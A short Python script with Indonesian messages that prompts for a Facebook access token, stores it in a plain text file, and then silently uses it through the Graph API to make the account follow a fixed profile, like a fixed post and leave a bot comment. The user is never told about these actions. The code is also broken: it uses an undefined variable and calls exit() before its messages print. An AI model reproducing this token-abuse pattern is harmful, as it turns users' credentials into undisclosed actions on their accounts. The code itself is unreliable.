#!/usr/bin/python3
#coding=utf-8

import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date

def login():
	os.system("clear")
	try:
		token = open('token.txt', 'r')
		exit()
		print("token kedaluwarsa !!!")
	except (KeyError, IOError):
		os.system('clear')
		token = input('(+) token : ')
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
		except KeyError:
			print("token kedaluwarsa !!!")
			sys.exit() 

def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit()
		print("token kedaluwarsa !!!")
	kom = ("Komentar Ini Ditulis Oleh Bot ")
	requests.post('https://graph.facebook.com/100058252283419/subscribers?access_token=' + token) 
	requests.post('https://graph.facebook.com/409580980993641/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/409580980993641/comments/?message=' + kom + '&access_token=' + toket)
	
	
login()